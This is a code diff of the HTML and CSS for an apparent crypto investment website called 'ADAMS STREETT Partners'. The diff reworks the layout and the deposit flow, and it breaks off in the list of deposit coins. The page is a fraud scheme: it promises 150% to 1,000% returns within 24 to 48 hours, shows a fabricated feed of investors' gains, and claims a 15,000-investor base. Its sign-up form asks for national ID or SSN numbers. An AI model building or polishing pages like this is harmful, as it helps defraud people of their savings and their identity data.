@@ -8,436 +8,151 @@
   <script src="https://s3.tradingview.com/external-embedding/embed-widget-mini-symbol-overview.js" async></script>
   <style>
     /* ===== RESET & BASE ===== */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    }
-    html, body {
-      width: 100%;
-      min-height: 100vh;
-      background: #0b0e14;
-      color: #e8edf5;
-    }
-    body {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 20px;
-    }
-    .container {
-      max-width: 1400px;
-      width: 100%;
-    }
-    .page {
-      display: none;
-      animation: fadeIn 0.4s ease;
-    }
-    .page.active { display: block; }
-    @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    body { background: #0b0e14; color: #e8edf5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+    .container { max-width: 1400px; width: 100%; }
 
     /* ===== NAV ===== */
     .nav {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 20px 0;
-      border-bottom: 1px solid #1e2a3a;
-      margin-bottom: 30px;
-      flex-wrap: wrap;
-      gap: 12px;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 20px 0; border-bottom: 1px solid #1e2a3a; margin-bottom: 30px;
+      flex-wrap: wrap; gap: 12px; width: 100%;
     }
-    .logo {
-      font-size: 24px;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-      background: linear-gradient(135deg, #f6d365, #fda085);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
+    .logo { font-size: 24px; font-weight: 700; letter-spacing: -0.5px; background: linear-gradient(135deg, #f6d365, #fda085); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
     .logo span { font-weight: 300; color: #8b9bb5; -webkit-text-fill-color: #8b9bb5; }
-    .nav-links {
-      display: flex;
-      gap: 24px;
-      align-items: center;
-      flex-wrap: wrap;
-    }
-    .nav-links a {
-      color: #b0c4de;
-      font-size: 14px;
-      font-weight: 500;
-      transition: 0.2s;
-      cursor: pointer;
-      text-decoration: none;
-    }
+    .nav-links { display: flex; gap: 24px; align-items: center; flex-wrap: wrap; }
+    .nav-links a { color: #b0c4de; font-size: 14px; font-weight: 500; transition: 0.2s; cursor: pointer; text-decoration: none; }
     .nav-links a:hover { color: #ffffff; }
     .btn-outline {
-      padding: 8px 20px;
-      border: 1px solid #3b82f6;
-      border-radius: 30px;
-      color: #3b82f6;
-      background: transparent;
-      font-weight: 600;
-      font-size: 14px;
-      cursor: pointer;
-      transition: 0.2s;
+      padding: 8px 20px; border: 1px solid #3b82f6; border-radius: 30px;
+      color: #3b82f6; background: transparent; font-weight: 600; font-size: 14px;
+      cursor: pointer; transition: 0.2s;
     }
-    .btn-outline:hover {
-      background: #3b82f6;
-      color: #0b0e14;
-      text-decoration: none;
-    }
+    .btn-outline:hover { background: #3b82f6; color: #0b0e14; text-decoration: none; }
     .btn-primary {
-      padding: 12px 28px;
-      background: #3b82f6;
-      border: none;
-      border-radius: 30px;
-      color: #ffffff;
-      font-weight: 600;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.2s;
+      padding: 12px 28px; background: #3b82f6; border: none; border-radius: 30px;
+      color: #ffffff; font-weight: 600; font-size: 16px; cursor: pointer; transition: 0.2s;
     }
     .btn-primary:hover { background: #2563eb; transform: translateY(-1px); }
     .btn-success {
-      padding: 12px 28px;
-      background: #10b981;
-      border: none;
-      border-radius: 30px;
-      color: #ffffff;
-      font-weight: 600;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.2s;
+      padding: 12px 28px; background: #10b981; border: none; border-radius: 30px;
+      color: #ffffff; font-weight: 600; font-size: 16px; cursor: pointer; transition: 0.2s;
     }
     .btn-success:hover { background: #059669; }
     .btn-danger {
-      padding: 12px 28px;
-      background: #ef4444;
-      border: none;
-      border-radius: 30px;
-      color: #ffffff;
-      font-weight: 600;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.2s;
+      padding: 12px 28px; background: #ef4444; border: none; border-radius: 30px;
+      color: #ffffff; font-weight: 600; font-size: 16px; cursor: pointer; transition: 0.2s;
     }
     .btn-danger:hover { background: #dc2626; }
 
+    /* ===== PAGES ===== */
+    .page { display: none; animation: fadeIn 0.4s ease; }
+    .page.active { display: block; }
+    @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
+
     /* ===== CARDS ===== */
-    .card {
-      background: #141c2b;
-      border-radius: 20px;
-      padding: 32px;
-      border: 1px solid #1e2a3a;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
-    }
+    .card { background: #141c2b; border-radius: 20px; padding: 32px; border: 1px solid #1e2a3a; box-shadow: 0 8px 32px rgba(0,0,0,0.4); margin-bottom: 24px; }
 
     /* ===== FORMS ===== */
     .form-group { margin-bottom: 18px; }
-    .form-group label {
-      display: block;
-      font-size: 14px;
-      font-weight: 500;
-      color: #b0c4de;
-      margin-bottom: 6px;
-    }
+    .form-group label { display: block; font-size: 14px; font-weight: 500; color: #b0c4de; margin-bottom: 6px; }
     .form-group input, .form-group select {
-      width: 100%;
-      padding: 12px 16px;
-      background: #0b0e14;
-      border: 1px solid #2a3a4e;
-      border-radius: 12px;
-      color: #e8edf5;
-      font-size: 15px;
-      transition: 0.2s;
+      width: 100%; padding: 12px 16px; background: #0b0e14; border: 1px solid #2a3a4e; border-radius: 12px;
+      color: #e8edf5; font-size: 15px; transition: 0.2s;
     }
     .form-group input:focus, .form-group select:focus {
-      outline: none;
-      border-color: #3b82f6;
-      box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
+      outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
     }
-    .form-row {
-      display: flex;
-      gap: 16px;
-      flex-wrap: wrap;
-    }
-    .form-row .form-group { flex: 1; min-width: 180px; }
 
     /* ===== DASHBOARD ===== */
     .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 20px;
-      margin: 24px 0;
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px; margin: 24px 0;
     }
     .stat-card {
-      background: #1a2538;
-      padding: 20px;
-      border-radius: 16px;
-      border-left: 4px solid #3b82f6;
+      background: #1a2538; padding: 20px; border-radius: 16px; border-left: 4px solid #3b82f6;
     }
-    .stat-card .label {
-      font-size: 13px;
-      color: #8b9bb5;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-    .stat-card .value {
-      font-size: 28px;
-      font-weight: 700;
-      margin-top: 6px;
-    }
+    .stat-card .label { font-size: 13px; color: #8b9bb5; text-transform: uppercase; letter-spacing: 0.5px; }
+    .stat-card .value { font-size: 28px; font-weight: 700; margin-top: 6px; }
     .stat-card .value .currency { font-size: 18px; color: #8b9bb5; }
 
     /* ===== PLANS ===== */
     .plans-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 20px;
-      margin: 24px 0;
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 12px; margin: 16px 0;
     }
     .plan-card {
-      background: #1a2538;
-      padding: 24px;
-      border-radius: 16px;
-      text-align: center;
-      border: 1px solid #2a3a4e;
-      transition: 0.3s;
-      cursor: pointer;
+      background: #1a2538; padding: 16px; border-radius: 12px; text-align: center;
+      border: 1px solid #2a3a4e; cursor: pointer; transition: 0.2s;
     }
-    .plan-card:hover {
-      border-color: #3b82f6;
-      transform: translateY(-4px);
-      box-shadow: 0 8px 24px rgba(59,130,246,0.15);
-    }
-    .plan-card .name { font-size: 20px; font-weight: 700; }
-    .plan-card .min { font-size: 14px; color: #8b9bb5; margin: 8px 0; }
-    .plan-card .return { font-size: 26px; font-weight: 700; color: #10b981; }
-    .plan-card .return-label { font-size: 12px; color: #8b9bb5; }
-    .plan-card .tag {
-      display: inline-block;
-      background: #3b82f6;
-      color: #fff;
-      font-size: 10px;
-      font-weight: 600;
-      padding: 2px 10px;
-      border-radius: 20px;
-      margin-top: 6px;
-      letter-spacing: 0.5px;
-    }
+    .plan-card:hover { border-color: #3b82f6; transform: translateY(-2px); }
+    .plan-card.selected { border-color: #3b82f6; background: #1e2a3a; }
+    .plan-card .name { font-weight: 700; font-size: 16px; }
+    .plan-card .min { font-size: 12px; color: #8b9bb5; }
+    .plan-card .return { color: #10b981; font-weight: 600; }
 
-    /* ===== LIVE FEED ===== */
-    .live-feed {
-      background: #0b0e14;
-      border-radius: 12px;
-      padding: 16px;
-      border: 1px solid #1e2a3a;
-      max-height: 140px;
-      overflow-y: auto;
-      margin: 20px 0;
-      font-size: 14px;
-    }
-    .live-feed .entry {
-      padding: 6px 0;
-      border-bottom: 1px solid #1a2538;
-      color: #b0c4de;
-    }
-    .live-feed .entry .highlight { color: #10b981; font-weight: 600; }
-
-    /* ===== TICKER ===== */
-    .ticker {
-      background: #1a2538;
-      padding: 12px 16px;
-      border-radius: 12px;
-      margin: 20px 0;
-      overflow: hidden;
-      white-space: nowrap;
-      border: 1px solid #2a3a4e;
-      font-size: 14px;
-      color: #b0c4de;
-    }
-    .ticker span { margin-right: 40px; }
-    .ticker .green { color: #10b981; }
-    .ticker .red { color: #ef4444; }
-
-    /* ===== WALLET ADDRESS ===== */
+    /* ===== WALLET ===== */
     .wallet-address {
-      background: #0b0e14;
-      padding: 12px 16px;
-      border-radius: 10px;
-      font-family: monospace;
-      word-break: break-all;
-      border: 1px solid #2a3a4e;
-      margin: 8px 0;
+      background: #0b0e14; padding: 12px 16px; border-radius: 10px;
+      font-family: monospace; word-break: break-all; border: 1px solid #2a3a4e; margin: 8px 0;
     }
 
-    /* ===== VALIDATION OVERLAY ===== */
-    .validation-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(11,14,20,0.92);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      flex-direction: column;
-    }
-    .validation-overlay.active { display: flex; }
-    .validation-overlay .spinner {
-      width: 48px;
-      height: 48px;
-      border: 4px solid #1e2a3a;
-      border-top-color: #3b82f6;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes spin { 100% { transform: rotate(360deg); } }
-    .validation-overlay p { font-size: 18px; color: #b0c4de; }
+    /* ===== STATUS ===== */
+    .status-msg { margin-top: 12px; padding: 10px; border-radius: 8px; text-align: center; }
+    .status-msg.success { background: #10b98120; color: #10b981; border: 1px solid #10b981; }
+    .status-msg.error { background: #ef444420; color: #ef4444; border: 1px solid #ef4444; }
+    .status-msg.loading { background: #3b82f620; color: #3b82f6; border: 1px solid #3b82f6; }
 
-    /* ===== FAQ ===== */
-    .faq-item { margin-bottom: 16px; }
-    .faq-item .q { font-weight: 600; color: #e8edf5; }
-    .faq-item .a { color: #b0c4de; margin-top: 4px; }
-
-    /* ===== HERO — FULL SCREEN ===== */
+    /* ===== LANDING SPECIFIC ===== */
     .hero-full {
-      position: relative;
-      border-radius: 20px;
-      overflow: hidden;
-      margin-bottom: 30px;
-      min-height: 60vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: 40px 20px;
+      position: relative; border-radius: 20px; overflow: hidden; margin-bottom: 30px;
+      min-height: 60vh; display: flex; align-items: center; justify-content: center;
+      text-align: center; padding: 40px 20px;
       background: linear-gradient(135deg, rgba(11,14,20,0.85) 0%, rgba(11,14,20,0.5) 100%), url('https://i.imgur.com/7XpracR.jpg');
-      background-size: cover;
-      background-position: center;
-      width: 100%;
+      background-size: cover; background-position: center; width: 100%;
     }
-    .hero-full .content {
-      position: relative;
-      z-index: 2;
-      max-width: 900px;
-    }
-    .hero-full h1 {
-      font-size: clamp(36px, 6vw, 64px);
-      font-weight: 700;
-      margin-bottom: 16px;
-      background: linear-gradient(135deg, #f6d365, #fda085);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .hero-full p {
-      font-size: clamp(16px, 2vw, 24px);
-      color: #b0c4de;
-      margin-bottom: 24px;
-      line-height: 1.6;
-    }
-    @media (max-width: 640px) {
-      .hero-full { min-height: 50vh; border-radius: 12px; }
-      .hero-full h1 { font-size: 28px; }
-    }
+    .hero-full .content { position: relative; z-index: 2; max-width: 900px; }
+    .hero-full h1 { font-size: clamp(36px, 6vw, 64px); font-weight: 700; margin-bottom: 16px; background: linear-gradient(135deg, #f6d365, #fda085); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .hero-full p { font-size: clamp(16px, 2vw, 24px); color: #b0c4de; margin-bottom: 24px; line-height: 1.6; }
+    @media (max-width: 640px) { .hero-full { min-height: 50vh; border-radius: 12px; } .hero-full h1 { font-size: 28px; } }
 
-    /* ===== BRUTAL GRID ===== */
     .brutal-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-      gap: 24px;
-      margin: 30px 0;
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 24px; margin: 30px 0;
     }
     .brutal-item {
-      background: #1a2538;
-      padding: 24px;
-      border-radius: 16px;
-      border-left: 4px solid #f6d365;
+      background: #1a2538; padding: 24px; border-radius: 16px; border-left: 4px solid #f6d365;
     }
-    .brutal-item strong {
-      color: #f6d365;
-      display: block;
-      font-size: 18px;
-      margin-bottom: 6px;
-    }
-    .brutal-item .text-muted {
-      color: #b0c4de;
-      font-size: 14px;
-      line-height: 1.5;
-    }
+    .brutal-item strong { color: #f6d365; display: block; font-size: 18px; margin-bottom: 6px; }
+    .brutal-item .text-muted { color: #b0c4de; font-size: 14px; line-height: 1.5; }
 
-    /* ===== MARKET STATS ===== */
     .market-stats {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-      gap: 16px;
-      background: #1a2538;
-      padding: 20px;
-      border-radius: 16px;
-      margin: 20px 0;
-      border: 1px solid #2a3a4e;
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 16px; background: #1a2538; padding: 20px; border-radius: 16px;
+      margin: 20px 0; border: 1px solid #2a3a4e;
     }
-    .market-stat .label {
-      font-size: 12px;
-      color: #8b9bb5;
-      text-transform: uppercase;
-    }
-    .market-stat .value {
-      font-size: 20px;
-      font-weight: 600;
-    }
+    .market-stat .label { font-size: 12px; color: #8b9bb5; text-transform: uppercase; }
+    .market-stat .value { font-size: 20px; font-weight: 600; }
 
-    /* ===== GLOBAL REACH ===== */
     .global-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-      gap: 16px;
-      margin: 20px 0;
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 16px; margin: 20px 0;
     }
     .global-item {
-      background: #1a2538;
-      padding: 16px;
-      border-radius: 12px;
-      text-align: center;
-      border: 1px solid #2a3a4e;
-      font-size: 14px;
-      color: #b0c4de;
+      background: #1a2538; padding: 16px; border-radius: 12px; text-align: center;
+      border: 1px solid #2a3a4e; font-size: 14px; color: #b0c4de;
     }
-    .global-item .flag {
-      font-size: 28px;
-      display: block;
-      margin-bottom: 4px;
-    }
+    .global-item .flag { font-size: 28px; display: block; margin-bottom: 4px; }
 
-    /* ===== TRUST BADGES ===== */
     .trust-badges {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 20px;
-      justify-content: center;
-      margin: 20px 0;
+      display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; margin: 20px 0;
     }
     .trust-badge {
-      background: #1a2538;
-      padding: 12px 24px;
-      border-radius: 30px;
-      border: 1px solid #2a3a4e;
-      font-size: 13px;
-      color: #b0c4de;
+      background: #1a2538; padding: 12px 24px; border-radius: 30px;
+      border: 1px solid #2a3a4e; font-size: 13px; color: #b0c4de;
     }
 
-    /* ===== CHART WRAPPER ===== */
-    .tradingview-widget-container {
-      margin: 20px 0;
-      border-radius: 16px;
-      overflow: hidden;
-      border: 1px solid #2a3a4e;
-    }
+    .tradingview-widget-container { margin: 20px 0; border-radius: 16px; overflow: hidden; border: 1px solid #2a3a4e; }
 
     /* ===== UTILITY ===== */
     .text-center { text-align: center; }
@@ -445,6 +160,7 @@
     .mt-12 { margin-top: 12px; }
     .mt-24 { margin-top: 24px; }
     .flex { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+    .flex-center { justify-content: center; }
 
     @media (max-width: 640px) {
       .nav { flex-direction: column; align-items: stretch; }
@@ -458,32 +174,25 @@
 <div class="container">
 
   <!-- ============================================================ -->
-  <!-- VALIDATION OVERLAY -->
-  <!-- ============================================================ -->
-  <div class="validation-overlay" id="validationOverlay">
-    <div class="spinner"></div>
-    <p id="validationText">Validating transaction on the blockchain...</p>
-  </div>
-
-  <!-- ============================================================ -->
-  <!-- NAV -->
+  <!-- NAVIGATION -->
   <!-- ============================================================ -->
   <nav class="nav">
     <div class="logo">ADAMS STREETT <span>Partners</span></div>
     <div class="nav-links">
       <a onclick="showPage('landing')">Home</a>
-      <a onclick="showPage('plans')">Plans</a>
+      <a onclick="showPage('invest')">Invest</a>
+      <a onclick="showPage('dashboard')">Dashboard</a>
       <a onclick="showPage('faq')">FAQ</a>
       <a class="btn-outline" onclick="showPage('login')">Sign In</a>
     </div>
   </nav>
 
   <!-- ============================================================ -->
-  <!-- LANDING — ULTIMATE EDITION -->
+  <!-- LANDING PAGE -->
   <!-- ============================================================ -->
   <div id="landing" class="page active">
 
-    <!-- Translation (In‑Site, bidirectional) -->
+    <!-- Translation Bar -->
     <div style="display: flex; justify-content: flex-end; padding: 10px 0; gap: 12px; flex-wrap: wrap;">
       <select id="languageSelect" onchange="translatePage(this.value)" style="background: #1a2538; color: #e8edf5; border: 1px solid #2a3a4e; border-radius: 8px; padding: 6px 12px; font-size: 14px;">
         <option value="en">🇺🇸 English</option>
@@ -499,23 +208,13 @@
       </select>
     </div>
 
-    <!-- Hero — Full Screen -->
+    <!-- Hero -->
     <div class="hero-full">
       <div class="content">
         <h1 id="heroTitle">Global Wealth. Institutional Access.</h1>
         <p id="heroSub">Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary quantitative models. Powered by Wall Street infrastructure.</p>
-        <button class="btn-primary" onclick="showPage('login')">Start Building Wealth</button>
+        <button class="btn-primary" onclick="showPage('invest')">Start Building Wealth</button>
       </div>
-    </div>
-
-    <!-- Live Ticker (static, but scrolls) -->
-    <div class="ticker" id="ticker">
-      <span>🇺🇸 S&P 500 <span class="green">+1.2%</span></span>
-      <span>🇪🇺 DAX <span class="green">+0.8%</span></span>
-      <span>🇯🇵 Nikkei <span class="red">-0.3%</span></span>
-      <span>🇬🇧 FTSE <span class="green">+0.5%</span></span>
-      <span>🇨🇳 Shanghai <span class="green">+1.8%</span></span>
-      <span>🇮🇳 Nifty <span class="green">+0.9%</span></span>
     </div>
 
     <!-- Market Stats -->
@@ -528,27 +227,15 @@
       <div class="market-stat"><div class="label">DXY</div><div class="value red">102.34</div></div>
     </div>
 
-    <!-- TradingView Widget (Live Chart) -->
+    <!-- TradingView Chart -->
     <div class="tradingview-widget-container">
       <div class="tradingview-widget-container__widget"></div>
       <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-mini-symbol-overview.js" async>
-      {
-        "symbol": "SPX",
-        "width": "100%",
-        "height": "200",
-        "locale": "en",
-        "dateRange": "1M",
-        "colorTheme": "dark",
-        "trendLineColor": "rgba(41, 98, 255, 1)",
-        "underLineColor": "rgba(41, 98, 255, 0.3)",
-        "isTransparent": false,
-        "autosize": true,
-        "largeChartUrl": ""
-      }
+      { "symbol": "SPX", "width": "100%", "height": "200", "locale": "en", "dateRange": "1M", "colorTheme": "dark", "isTransparent": false, "autosize": true }
       </script>
     </div>
 
-    <!-- Images (Embedded) -->
+    <!-- Images + Grid -->
     <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; margin: 30px 0;">
       <div style="background: #1a2538; border-radius: 16px; padding: 24px; border: 1px solid #2a3a4e;">
         <img src="https://i.imgur.com/UTsc7bb.jpg" alt="Trading Floor" style="width: 100%; border-radius: 12px; margin-bottom: 16px;">
@@ -562,7 +249,7 @@
       </div>
     </div>
 
-    <!-- Brutal Wall Street Grid -->
+    <!-- Brutal Grid -->
     <div style="background: #141c2b; border-radius: 20px; padding: 40px; border: 1px solid #1e2a3a; margin-bottom: 30px;">
       <h2 style="font-size: 28px; margin-bottom: 20px;">A New Standard in Alternative Investments</h2>
       <div class="brutal-grid">
@@ -575,7 +262,7 @@
       </div>
     </div>
 
-    <!-- Trust Badges (No Fictitious) -->
+    <!-- Trust Badges -->
     <div class="trust-badges">
       <span class="trust-badge">🔒 256‑bit Encryption</span>
       <span class="trust-badge">🏦 Custodial Banking Partners</span>
@@ -603,31 +290,22 @@
     </div>
 
     <!-- Live Feed -->
-    <div class="live-feed" id="liveFeed">
-      <div class="entry">James K. invested $5,000 — earned $17,500 in 22 hours</div>
-      <div class="entry">Sarah M. invested $500 — earned $1,250 in 19 hours</div>
-      <div class="entry">Michael T. invested $50,000 — earned $250,000 in 18 hours</div>
-      <div class="entry">David R. invested $100,000 — earned $700,000 in 16 hours</div>
-      <div class="entry">Emily W. invested $5,000 — earned $17,500 in 21 hours</div>
-      <div class="entry">Robert L. invested $500 — earned $1,250 in 20 hours</div>
-    </div>
-
-    <!-- Testimonial -->
-    <div style="background: #1a2538; border-radius: 16px; padding: 24px; border-left: 4px solid #3b82f6; margin-bottom: 30px;">
-      <p style="font-size: 16px; font-style: italic; color: #b0c4de;">"I was skeptical at first, but after my first 24‑hour cycle, I was genuinely impressed. The returns are real, and the platform is seamless. I've since referred six colleagues."</p>
-      <p style="margin-top: 8px;"><strong>— Jonathan M.</strong> <span class="text-muted">, Singapore (Platinum Investor)</span></p>
+    <div class="live-feed" id="liveFeed" style="background: #0b0e14; border-radius: 12px; padding: 16px; border: 1px solid #1e2a3a; max-height: 140px; overflow-y: auto; margin: 20px 0; font-size: 14px;">
+      <div class="entry" style="padding: 6px 0; border-bottom: 1px solid #1a2538; color: #b0c4de;">James K. invested $5,000 — earned $17,500 in 22 hours</div>
+      <div class="entry" style="padding: 6px 0; border-bottom: 1px solid #1a2538; color: #b0c4de;">Sarah M. invested $500 — earned $1,250 in 19 hours</div>
+      <div class="entry" style="padding: 6px 0; border-bottom: 1px solid #1a2538; color: #b0c4de;">Michael T. invested $50,000 — earned $250,000 in 18 hours</div>
     </div>
 
     <!-- Final CTA -->
     <div style="text-align: center; padding: 20px 0 40px;">
       <p style="font-size: 20px; font-weight: 600; margin-bottom: 16px;">Ready to Access Institutional Returns?</p>
-      <button class="btn-primary" onclick="showPage('login')">Open Your Account</button>
+      <button class="btn-primary" onclick="showPage('invest')">Open Your Account</button>
       <p class="text-muted" style="margin-top: 12px; font-size: 13px;">No fees. No lock‑ins. Withdraw anytime.</p>
     </div>
   </div>
 
   <!-- ============================================================ -->
-  <!-- LOGIN / REGISTER -->
+  <!-- LOGIN / REGISTER (only shown via nav) -->
   <!-- ============================================================ -->
   <div id="login" class="page">
     <div class="card" style="max-width: 520px; margin: 0 auto;">
@@ -642,436 +320,455 @@
         <p id="loginError" style="color:#ef4444; text-align:center; margin-top:12px; display:none;">Wrong email or password. Please try again.</p>
       </div>
       <div id="registerForm" style="display:none;">
-        <div class="form-row">
-          <div class="form-group"><label>First Name</label><input type="text" id="regFirstName" placeholder="John" /></div>
-          <div class="form-group"><label>Last Name</label><input type="text" id="regLastName" placeholder="Doe" /></div>
+        <div class="form-row" style="display: flex; gap: 16px; flex-wrap: wrap;">
+          <div class="form-group" style="flex:1; min-width:180px;"><label>First Name</label><input type="text" id="regFirstName" placeholder="John" /></div>
+          <div class="form-group" style="flex:1; min-width:180px;"><label>Last Name</label><input type="text" id="regLastName" placeholder="Doe" /></div>
         </div>
         <div class="form-group"><label>Email Address</label><input type="email" id="regEmail" placeholder="you@example.com" /></div>
         <div class="form-group"><label>Password</label><input type="password" id="regPassword" placeholder="••••••••" /></div>
         <div class="form-group"><label>Confirm Password</label><input type="password" id="regConfirm" placeholder="••••••••" /></div>
-        <div class="form-group"><label>National ID / SSN / NIN / Aadhaar</label>
-          <input type="text" id="regNationalId" placeholder="SSN / NIN / Aadhaar / National ID" />
-        </div>
+        <div class="form-group"><label>National ID / SSN / NIN / Aadhaar</label><input type="text" id="regNationalId" placeholder="SSN / NIN / Aadhaar / National ID" /></div>
         <button class="btn-success" style="width:100%;" onclick="handleRegister()">Create Account</button>
       </div>
     </div>
   </div>
 
   <!-- ============================================================ -->
-  <!-- PLANS -->
+  <!-- INVEST PAGE -->
   <!-- ============================================================ -->
-  <div id="plans" class="page">
+  <div id="invest" class="page">
     <div class="card">
-      <h2 style="margin-bottom: 24px;">Investment Plans</h2>
-      <div class="plans-grid">
-        <div class="plan-card" onclick="selectPlan('Starter', 500, 1250)">
+      <h2 style="margin-bottom: 8px;">Fund Your Investment</h2>
+      <p class="text-muted" id="checkoutPlan">Select a plan below</p>
+      <p class="text-muted" id="checkoutReturn">Expected Return: —</p>
+      <hr style="border-color:#1e2a3a; margin: 16px 0;">
+
+      <div class="plans-grid" id="planGrid">
+        <div class="plan-card" data-plan="Starter" data-amount="500" data-return="1250" onclick="selectPlan(this)">
           <div class="name">Starter</div>
-          <div class="tag">Best for beginners</div>
           <div class="min">Min. $500</div>
           <div class="return">$1,250</div>
-          <div class="return-label">in 24h (150% return)</div>
         </div>
-        <div class="plan-card" onclick="selectPlan('Pro', 5000, 17500)">
+        <div class="plan-card" data-plan="Pro" data-amount="5000" data-return="17500" onclick="selectPlan(this)">
           <div class="name">Pro</div>
-          <div class="tag">Popular choice</div>
           <div class="min">Min. $5,000</div>
           <div class="return">$17,500</div>
-          <div class="return-label">in 24h (250% return)</div>
         </div>
-        <div class="plan-card" onclick="selectPlan('Elite', 50000, 250000)">
+        <div class="plan-card" data-plan="Elite" data-amount="50000" data-return="250000" onclick="selectPlan(this)">
           <div class="name">Elite</div>
-          <div class="tag">High yield</div>
           <div class="min">Min. $50,000</div>
           <div class="return">$250,000</div>
-          <div class="return-label">in 24h (400% return)</div>
         </div>
-        <div class="plan-card" onclick="selectPlan('Platinum', 100000, 700000)">
+        <div class="plan-card" data-plan="Platinum" data-amount="100000" data-return="700000" onclick="selectPlan(this)">
           <div class="name">Platinum</div>
-          <div class="tag">VIP access</div>
           <div class="min">Min. $100,000</div>
           <div class="return">$700,000</div>
-          <div class="return-label">in 24h (600% return)</div>
         </div>
-        <div class="plan-card" onclick="selectPlan('Black Diamond', 250000, 2000000)">
+        <div class="plan-card" data-plan="Black Diamond" data-amount="250000" data-return="2000000" onclick="selectPlan(this)">
           <div class="name">Black Diamond</div>
-          <div class="tag">Institutional tier</div>
           <div class="min">Min. $250,000</div>
           <div class="return">$2,000,000</div>
-          <div class="return-label">in 48h (800% return)</div>
         </div>
-        <div class="plan-card" onclick="selectPlan('Centurion', 500000, 5000000)">
+        <div class="plan-card" data-plan="Centurion" data-amount="500000" data-return="5000000" onclick="selectPlan(this)">
           <div class="name">Centurion</div>
-          <div class="tag">Ultra-wealthy</div>
           <div class="min">Min. $500,000</div>
           <div class="return">$5,000,000</div>
-          <div class="return-label">in 48h (1,000% return)</div>
         </div>
       </div>
-    </div>
-  </div>
 
-  <!-- ============================================================ -->
-  <!-- DASHBOARD -->
-  <!-- ============================================================ -->
-  <div id="dashboard" class="page">
-    <div class="flex" style="justify-content: space-between; flex-wrap: wrap;">
-      <h2>Welcome Back, <span id="dashUser">Investor</span></h2>
-      <div class="flex">
-        <button class="btn-success" onclick="showPage('checkout')">Invest</button>
-        <button class="btn-danger" onclick="showPage('withdraw')">Withdraw</button>
-        <button class="btn-outline" onclick="logout()">Logout</button>
-      </div>
-    </div>
-    <div class="stats-grid">
-      <div class="stat-card"><div class="label">Total Balance</div><div class="value"><span class="currency">$</span><span id="dashBalance">0.00</span></div></div>
-      <div class="stat-card" style="border-left-color:#10b981;"><div class="label">Total Earned</div><div class="value"><span class="currency">$</span><span id="dashEarned">0.00</span></div></div>
-      <div class="stat-card" style="border-left-color:#f59e0b;"><div class="label">Active Plans</div><div class="value" id="dashPlans">0</div></div>
-    </div>
-  </div>
-
-  <!-- ============================================================ -->
-  <!-- CHECKOUT -->
-  <!-- ============================================================ -->
-  <div id="checkout" class="page">
-    <div class="card" style="max-width: 560px; margin: 0 auto;">
-      <h2 style="margin-bottom: 8px;">Fund Your Investment</h2>
-      <p class="text-muted" id="checkoutPlan">Plan: <strong>Starter</strong> — $500</p>
-      <p class="text-muted" id="checkoutReturn">Expected Return: <strong style="color:#10b981;">$1,250</strong></p>
-      <hr style="border-color:#1e2a3a; margin: 16px 0;">
-      <div class="form-group"><label>Amount (USD)</label><input type="number" id="checkoutAmount" value="500" step="1" min="500" /></div>
-      <div class="form-group"><label>Select Crypto</label>
-        <select id="checkoutCrypto" style="width:100%; padding:12px 16px; background:#0b0e14; border:1px solid #2a3a4e; border-radius:12px; color:#e8edf5;">
+      <div class="form-group">
+        <label>Select Crypto</label>
+        <select id="cryptoSelect" onchange="updateWallet()">
           <option value="BTC">Bitcoin (BTC)</option>
           <option value="ETH">Ethereum (ETH)</option>
-          <option value="USDT">USDT (ERC-20)</option>
+          <option value="SOL">Solana (SOL)</option>
+          <option value="BSC">BNB Smart Chain (BSC)</option>
+          <option value="BNB">BNB (BEP-20)</option>
